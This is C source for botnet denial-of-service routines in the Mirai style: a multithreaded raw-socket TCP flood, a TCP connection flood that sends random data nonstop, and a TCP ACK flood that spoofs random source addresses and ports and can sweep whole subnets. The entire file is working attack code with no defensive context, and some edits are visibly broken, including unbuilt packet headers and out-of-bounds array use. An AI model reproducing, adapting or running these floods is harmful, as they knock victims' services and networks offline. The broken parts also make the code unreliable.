#define MAX_THREADS 100

struct thread_args {
    int thread_id;
    int fd;
    struct sockaddr_in *sock_addr;
    char *pkt;
};

struct attack_thread_params {
    struct sockaddr_in addr;
    char* buf;
    uint16_t len;
    BOOL rand_len;
};

void *thread_attack(void *args)
{
    struct thread_args *thread_args = (struct thread_args *)args;

    while (1) {
        sendto(thread_args->fd, thread_args->pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + 900, MSG_NOSIGNAL, (struct sockaddr *)thread_args->sock_addr, sizeof(struct sockaddr_in));
    }

    pthread_exit(NULL);
}

void* attack_thread(void* arg)
{
    struct attack_thread_params* params = (struct attack_thread_params*)arg;
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd == -1) {
        pthread_exit(NULL);
    }

    fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));

    errno = 0;
    if (connect(fd, (struct sockaddr*)&(params->addr), sizeof(struct sockaddr_in)) != -1 || errno != EINPROGRESS) {
        close(fd);
        pthread_exit(NULL);
    }

    fd_set write_set;
    struct timeval timeout;
    int fds;
    socklen_t err = 0;
    int err_len = sizeof(int);
    time_t start_time = time(NULL);

    while (TRUE) {
        FD_ZERO(&write_set);
        FD_SET(fd, &write_set);

        timeout.tv_usec = 10;
        timeout.tv_sec = 0;

        fds = select(fd + 1, NULL, &write_set, NULL, &timeout);
        if (fds == 1) {
            getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &err_len);

            if (err) {
                close(fd);
                pthread_exit(NULL);
            }
            break;
        } else if (fds == -1) {
            close(fd);
            pthread_exit(NULL);
        }

        if (start_time + 5 < time(NULL)) {
            close(fd);
            pthread_exit(NULL);
        }
    }

    if (params->rand_len) {
        params->len = ((rand_next() % (params->len - 500) + 1) + 500);
    }

    while (send(fd, params->buf, params->len, MSG_NOSIGNAL) != -1 || errno == EAGAIN) {
        // Thực hiện gửi dữ liệu
    }

    close(fd);
    pthread_exit(NULL);
}

void attack_tcp_thread(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, FALSE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, TRUE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        while (1)
            sleep(1);
        return;
    }

    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        while (1)
            sleep(1);
        return;
    }

    // Tạo và khởi tạo các luồng
    pthread_t threads[MAX_THREADS];
    struct thread_args thread_args[MAX_THREADS];

    for (i = 0; i < MAX_THREADS; i++) {
        thread_args[i].thread_id = i;
        thread_args[i].fd = fd;
        thread_args[i].sock_addr = malloc(sizeof(struct sockaddr_in));
        memcpy(thread_args[i].sock_addr, &targs[i % targs_len].sock_addr, sizeof(struct sockaddr_in));

        pkts[i] = calloc(128, sizeof(char));
        struct iphdr *iph = (struct iphdr *)pkts[i];
        struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
        uint8_t *opts = (uint8_t *)(tcph + 1);

        // Các phần khác giữ nguyên như trong đoạn code gốc

        thread_args[i].pkt = pkts[i];

        // Tạo luồng mới và thực thi
        pthread_create(&threads[i], NULL, thread_attack, (void *)&thread_args[i]);
    }

    // Chờ các luồng kết thúc
    for (i = 0; i < MAX_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }
}


void attack_tcp_socket(uint8_t targs_len, struct attack_target* targs, uint8_t opts_len, struct attack_option* opts)
{
    BOOL rand_len = attack_get_opt_int(opts_len, opts, ATK_OPT_RAND_LEN, TRUE);
    uint16_t len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 900);
    uint16_t port = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = targs[0].addr;

    char* buf = calloc(len, sizeof(char));
    rand_str((unsigned char*)buf, len);

    int clear = 0;

    pthread_t threads[MAX_FDS];
    struct attack_thread_params thread_params[MAX_FDS];

    for (int i = 0; i < MAX_FDS; i++) {
        thread_params[i].addr = addr;
        thread_params[i].buf = buf;
        thread_params[i].len = len;
        thread_params[i].rand_len = rand_len;

        int result = pthread_create(&threads[i], NULL, attack_thread, &thread_params[i]);
        if (result != 0) {
            // Xử lý lỗi khi tạo luồng không thành công
        }
    }

    for (int i = 0; i < MAX_FDS; i++) {
        pthread_join(threads[i], NULL);
    }

    free(buf);
}

void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0xffff);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        while (1)
            sleep(1);
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        while (1)
            sleep(1);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        char *payload;

        pkts[i] = calloc(1510, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        payload = (char *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htons(seq);
        tcph->doff = 5;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;
        tcph->window = rand_next() & 0xffff;
        if (psh_fl)
            tcph->psh = TRUE;

        rand_str(payload, data_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);

            // For prefix attacks
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                tcph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                tcph->dest = rand_next() & 0xffff;
            if (seq == 0xffff)
                tcph->seq = rand_next();
            if (ack == 0xffff)
                tcph->ack_seq = rand_next();

            // Randomize packet content?
            if (data_rand)
                rand_str(data, data_len);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);

            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}

